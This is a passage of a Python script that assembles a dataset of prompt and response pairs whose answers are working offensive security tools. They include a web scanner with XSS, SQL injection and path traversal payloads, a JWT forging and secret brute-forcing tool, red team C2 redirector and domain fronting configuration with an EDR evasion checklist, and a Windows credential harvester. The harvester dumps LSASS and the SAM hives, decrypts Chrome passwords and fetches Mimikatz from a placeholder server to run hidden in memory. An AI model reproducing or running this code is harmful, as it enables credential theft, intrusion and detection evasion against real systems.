                    "'><img src=x onerror=alert(1)>",'<svg onload=alert(1)>']
        for form in forms:
            for payload in payloads:
                data = {k:payload for k in form['inputs']}
                try:
                    r = self.session.post(form['action'],data=data,timeout=8) if form['method']=='POST' \
                        else self.session.get(form['action'],params=data,timeout=8)
                    if payload in r.text:
                        self.log('HIGH','Reflected XSS',form['action'],f'payload reflected unescaped')
                        return
                except: pass

    def check_security_headers(self, url):
        try:
            r = self.session.get(url, timeout=10)
            missing = [h for h in ['X-Frame-Options','X-Content-Type-Options',
                                    'Strict-Transport-Security','Content-Security-Policy']
                       if h not in r.headers]
            if missing: self.log('MEDIUM','Missing Security Headers',url,', '.join(missing))
            srv = r.headers.get('Server','')
            if srv: self.log('LOW','Server Disclosure',url,f'Server: {srv}')
            cookies_hdr = r.headers.get('Set-Cookie','')
            if 'Set-Cookie' in r.headers:
                if 'HttpOnly' not in cookies_hdr: self.log('MEDIUM','Cookie No HttpOnly',url)
                if 'Secure' not in cookies_hdr: self.log('MEDIUM','Cookie No Secure Flag',url)
        except: pass

    def check_path_traversal(self, url):
        parsed = urlparse(url); params = {k:v[0] for k,v in parse_qs(parsed.query).items()}
        for param in params:
            for payload in ['../../../etc/passwd','..%2F..%2Fetc%2Fpasswd']:
                test = {**params, param:payload}
                test_url = urlunparse(parsed._replace(query=urlencode(test)))
                try:
                    r = self.session.get(test_url, timeout=8)
                    if 'root:' in r.text and '/bin/' in r.text:
                        self.log('CRITICAL','Path Traversal',test_url,f'param={param} returns /etc/passwd')
                        return
                except: pass

    def get_links(self, url):
        try:
            r = self.session.get(url, timeout=10)
            soup = BeautifulSoup(r.text,'html.parser')
            return list(set(
                urljoin(url,tag.get('href','') or tag.get('action',''))
                for tag in soup.find_all(['a','form'])
                if (tag.get('href') or tag.get('action','')).__class__ and
                urljoin(url,tag.get('href','') or tag.get('action','')).startswith(self.base)
            ))
        except: return []

    def scan(self, max_pages=30):
        print(f'[*] Scanning: {self.base}')
        queue = [self.base]
        while queue and len(self.visited) < max_pages:
            url = queue.pop(0)
            if url in self.visited: continue
            self.visited.add(url); print(f'[*] {url}')
            self.check_security_headers(url)
            parsed = urlparse(url)
            params = {k:v[0] for k,v in parse_qs(parsed.query).items()}
            if params: self.check_sqli(url, params); self.check_path_traversal(url)
            forms = self.get_forms(url)
            self.check_xss(url, forms)
            for link in self.get_links(url):
                if link not in self.visited: queue.append(link)
        print(f'\\n[*] Complete: {len(self.findings)} findings across {len(self.visited)} pages')
        return self.findings

if __name__ == '__main__':
    WebScanner(sys.argv[1]).scan()
```
Install: pip install requests beautifulsoup4. Covers OWASP A01 (path traversal), A02 (missing HTTPS headers), A03 (SQLi+XSS injection), A05 (security headers/cookie flags). Extend with: SSRF detection (probe internal URLs via fetch params), CORS misconfiguration (check Access-Control-Allow-Origin: *), JWT weakness, XXE injection (XML endpoints), template injection ({{7*7}} in form fields). For serious scanning use Burp Suite Pro + active scanner extensions."""),

("Build a Python JWT vulnerability testing tool.",
"""```python
import base64, json, hmac, hashlib, sys, requests
from typing import Optional

def b64d(s): return base64.urlsafe_b64decode(s + '=='*(-len(s)%4 or 4))
def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def parse_jwt(token):
    parts = token.split('.')
    if len(parts)!=3: raise ValueError('Not a JWT')
    return (json.loads(b64d(parts[0])), json.loads(b64d(parts[1])),
            parts[2], parts[0], parts[1])

def forge_none(token):
    'Algorithm=none attack: remove signature entirely.'
    header, payload, _, _, _ = parse_jwt(token)
    results = []
    for alg in ['none','None','NONE','nOnE']:
        header['alg'] = alg
        h = b64e(json.dumps(header,separators=(',',':')).encode())
        p = b64e(json.dumps(payload,separators=(',',':')).encode())
        results.append(f'{h}.{p}.')
    return results

def forge_hs256_pubkey(token, public_key: bytes):
    'RS256->HS256 confusion: sign with public key as HMAC secret.'
    header, payload, _, _, _ = parse_jwt(token)
    header['alg'] = 'HS256'
    h = b64e(json.dumps(header,separators=(',',':')).encode())
    p = b64e(json.dumps(payload,separators=(',',':')).encode())
    sig = hmac.new(public_key, f'{h}.{p}'.encode(), hashlib.sha256).digest()
    return f'{h}.{p}.{b64e(sig)}'

def modify_payload(token, changes: dict):
    header, payload, sig, h, p = parse_jwt(token)
    payload.update(changes)
    new_p = b64e(json.dumps(payload,separators=(',',':')).encode())
    return f'{h}.{new_p}.{sig}', f'{h}.{new_p}.'

def brute_force_secret(token, wordlist):
    header, payload, signature, h, p = parse_jwt(token)
    alg = header.get('alg','HS256')
    if alg not in ('HS256','HS384','HS512'): return None
    hfn = {'HS256':hashlib.sha256,'HS384':hashlib.sha384,'HS512':hashlib.sha512}[alg]
    sig_bytes = b64d(signature)
    signing = f'{h}.{p}'.encode()
    print(f'[*] Bruteforcing {alg} secret...')
    with open(wordlist) as f:
        for i,line in enumerate(f):
            secret = line.strip().encode()
            if hmac.new(secret, signing, hfn).digest() == sig_bytes:
                print(f'[+] SECRET: {secret.decode()!r} after {i+1} attempts')
                return secret.decode()
            if i%10000==0: print(f'[*] {i:,}...', end='\\r')
    return None

def test_endpoint(url, token, header_name='Authorization'):
    header, payload, _, _, _ = parse_jwt(token)
    print(f'[*] Testing JWT attacks: {url}')
    print(f'[*] Claims: {json.dumps(payload)}')
    session = requests.Session()

    def test(name, forged):
        r = session.get(url, headers={header_name: f'Bearer {forged}'}, timeout=10)
        status = f'HTTP {r.status_code}'
        ok = r.status_code not in (401,403)
        print(f'  {"[VULN!]" if ok else "[    ]"} {name}: {status}')
        return ok

    for t in forge_none(token): test(f'none-alg ({t[:20]}...)', t)
    tampered, unsigned = modify_payload(token, {'role':'admin','is_admin':True})
    test('payload-tamper unsigned', unsigned)
    test('payload-tamper orig-sig', tampered)

if __name__ == '__main__':
    sample = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwibmFtZSI6IlRlc3QiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
    h,p,_,_,_ = parse_jwt(sample)
    print(f'Header: {json.dumps(h)}')
    print(f'Payload: {json.dumps(p)}')
    print('\\nNone-algorithm forgeries:')
    for t in forge_none(sample): print(f'  {t}')
    if len(sys.argv)>2: test_endpoint(sys.argv[1], sys.argv[2])
```
JWT attacks: 1. None algorithm -- library accepts unsigned token (CVE-2015-9235). 2. Algorithm confusion RS256->HS256 -- asymmetric public key used as HMAC secret. 3. Weak secret brute-force -- rockyou.txt catches 'secret','password','company-name'. 4. kid injection -- key ID used in SQL query or file path. 5. jwk header injection -- attacker provides own public key in token. For production testing: jwt_tool by ticarpi. Mitigation: explicitly whitelist accepted algorithms, never allow 'none'."""),
]

bz_d = [
("Explain red team infrastructure design: redirectors, domain fronting, and OPSEC.",
"""Red team infrastructure — tiered architecture to protect C2 and maintain operational persistence.

**Tier architecture:**
```
Target -> Redirector (sacrificial VPS) -> CDN -> C2 server (protected)
```
Redirector = cheap VPS that takes the hit if burned. C2 stays hidden.

**Redirector setup (Nginx traffic filtering):**
```nginx
server {
    listen 443 ssl;
    ssl_certificate /etc/letsencrypt/live/domain/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/domain/privkey.pem;
    # Only proxy legitimate C2 callbacks (correct User-Agent + URI pattern)
    location /api/v2/telemetry {
        # Filter: only forward if User-Agent matches expected implant
        if ($http_user_agent !~* "Mozilla/5.0.*Windows NT") { return 403; }
        proxy_pass https://C2_SERVER_IP;
        proxy_set_header Host $host;
    }
    # All other requests -> redirect to legitimate site (blends traffic)
    location / { return 302 https://www.microsoft.com$request_uri; }
}
```

**Domain fronting concept:**
```
HTTPS connection to CDN edge:
  SNI:  legitimate-company.azurefd.net  (what firewall sees)
  Host: your-c2-backend.azurefd.net     (where CDN routes it)

Target firewall only sees legitimate CDN IP/domain.
C2 traffic blends with normal corporate cloud traffic.
```

**OPSEC checklist:**
```python
OPSEC = {
    'Infrastructure': [
        'Never connect to C2 from personal/home IP -- use VPN chain or Tor',
        'Register domains with WHOIS privacy',
        'Use aged domains (>1yr) -- new domains trigger reputation block',
        'Category the domain correctly (tech/business not suspicious)',
        'Valid TLS cert -- self-signed is a detection signature',
        'Separate infrastructure per engagement, never reuse',
        'Purchase VPS with crypto, avoid personal payment methods',
    ],
    'C2 Beaconing': [
        'Interval >= 30s with >= 30% jitter -- regular timing = signature in NDR',
        'Blend with normal traffic: HTTPS to CDN, not direct IP',
        'User-Agent must match real browser/OS combination exactly',
        'Profile target network traffic patterns before operation',
        'Use HTTP/2 or WebSocket -- matches modern SaaS traffic',
    ],
    'Payload Delivery': [
        'Code-sign if possible -- unsigned PE triggers SmartScreen',
        'Avoid default C2 templates -- Cobalt Strike defaults blocked by AV',
        'Test against Defender + CrowdStrike in isolated VM first',
        'Preferred delivery: spearphishing > watering hole > physical',
        'Payload staging: small dropper downloads full implant from CDN',
    ],
    'Post-Compromise': [
        'Living off the land: certutil, mshta, regsvr32, wmic built-in',
        'Reflective DLL injection: implant runs from memory, not disk',
        'Avoid touching LSASS without explicit scope authorization',
        'Timestomp created/modified/accessed if needed for forensic evasion',
        'Event log clearing: very noisy itself -- often worse than logs',
    ]
}
for cat, items in OPSEC.items():
    print(f'\\n{cat}:')
    for item in items: print(f'  [+] {item}')
```

EDR evasion fundamentals: CrowdStrike/SentinelOne/Defender hook usermode APIs via IAT/EAT patching. Counter: unhook by loading clean NTDLL from \\KnownDlls or disk, then call unhooked version. Direct syscalls (SysWhispers) bypass API hooks entirely -- jump straight to kernel. Cobalt Strike malleable C2 profiles customise all network traffic, process injection techniques, and artifact names. Sliver (open-source C2) provides similar capabilities."""),

("Build a Python post-exploitation credential harvesting tool.",
"""```python
#!/usr/bin/env python3
'Windows post-exploitation credential harvest -- authorised testing only. Requires admin.'
import subprocess, os, sys, base64, shutil, sqlite3
from pathlib import Path

def run(cmd): 
    r = subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=30)
    return r.stdout + r.stderr

# === Method 1: LSASS dump via comsvcs.dll (living off the land) ===
def dump_lsass_comsvcs():
    'No external tools -- uses Windows built-in comsvcs.dll'
    tasklist = run('tasklist /fi "imagename eq lsass.exe" /fo csv /nh')
    pid = tasklist.split(',')[1].strip('"') if ',' in tasklist else '???'
    out = os.path.join(os.environ.get('TEMP','C:\\\\Windows\\\\Temp'), 'ls.dmp')
    result = run(f'rundll32.exe comsvcs.dll, MiniDump {pid} {out} full')
    if os.path.exists(out):
        return f'[+] LSASS dump: {out} ({os.path.getsize(out)}b) -- parse with pypykatz or Mimikatz'
    return f'[-] Failed: {result}'

# === Method 2: SAM/SYSTEM/SECURITY hive extraction ===
def dump_registry_hives():
    'Extract offline -- parse with impacket-secretsdump'
    tmp = os.environ.get('TEMP','C:\\\\Temp')
    paths = {'SAM':f'{tmp}\\\\sam.save','SYSTEM':f'{tmp}\\\\system.save',
             'SECURITY':f'{tmp}\\\\security.save'}
    for hive, path in paths.items():
        out = run(f'reg save HKLM\\\\{hive} {path} /y')
        print(f'  [{"+" if "success" in out.lower() else "-"}] {hive}: {path}')
    print('\\n  [*] Parse: impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL')
    return paths

# === Method 3: Credential Manager ===
def harvest_cred_manager():
    output = run('cmdkey /list')
    entries = [l.strip() for l in output.split('\\n') if any(k in l for k in ['Target','User','Type'])]
    for e in entries: print(f'  {e}')
    return entries

# === Method 4: Chrome passwords (current user context) ===
def chrome_passwords():
    chrome_db = Path(os.environ.get('LOCALAPPDATA','')) / 'Google/Chrome/User Data/Default/Login Data'
    if not chrome_db.exists(): return []
    tmp = str(chrome_db) + '.tmp'
    shutil.copy2(str(chrome_db), tmp)
    conn = sqlite3.connect(tmp)
    results = []
    for url, user, pwd_enc in conn.execute('SELECT origin_url,username_value,password_value FROM logins'):
        try:
            import win32crypt
            pwd = win32crypt.CryptUnprotectData(pwd_enc,None,None,None,0)[1].decode()
            if pwd: print(f'  [CHROME] {url} | {user} | {pwd}'); results.append((url,user,pwd))
        except ImportError: print('  [*] pywin32 needed for Chrome decryption -- use LaZagne instead')
        except: pass
    conn.close(); os.remove(tmp)
    return results

# === Method 5: In-memory PowerShell Mimikatz ===
def mimikatz_inmemory(server='YOUR_HTTPS_SERVER'):
    'Downloads and executes Mimikatz entirely in memory -- no disk artifacts'
    cmd = (f'IEX(New-Object Net.WebClient).DownloadString(\\'{server}/Invoke-Mimikatz.ps1\\');'
           f'Invoke-Mimikatz -Command \\"sekurlsa::logonpasswords\\"')
    encoded = base64.b64encode(cmd.encode('utf-16-le')).decode()
    full_cmd = f'powershell.exe -NoP -NonI -W Hidden -Enc {encoded}'
    print(f'  [*] Run: {full_cmd}')
    return full_cmd

def main():
    print('[*] Credential Harvest -- requires SYSTEM or Admin')
    print('\\n[1] LSASS dump (comsvcs.dll):'); print(f'  {dump_lsass_comsvcs()}')
    print('\\n[2] Registry hives:'); dump_registry_hives()
    print('\\n[3] Credential Manager:'); harvest_cred_manager()
    print('\\n[4] Chrome passwords:'); chrome_passwords()
    print('\\n[5] In-memory Mimikatz:'); mimikatz_inmemory()

if __name__ == '__main__': main()
```
LSASS (Local Security Authority Subsystem): holds NTLM hashes, Kerberos tickets, cleartext creds for recent logins. comsvcs.dll method: built into Windows, no external tooling needed -- LOL (living off the land). Offline parsing: impacket-secretsdump decodes SAM+SYSTEM to local NTLM hashes. Pass-the-Hash (PtH): use NTLM hash directly without cracking -- impacket-psexec, CrackMapExec. Pass-the-Ticket (PtT): import Kerberos TGT extracted from LSASS -- mimikatz sekurlsa::tickets. pypykatz: pure-Python Mimikatz implementation -- parse LSASS dump offline."""),
]

w("bu", bu)
w("bv", bv)
w("bw", bw)
w("bx", bx_data)
w("by", by_d)
w("bz", bz_d)
print("All cyber builder stages written.")
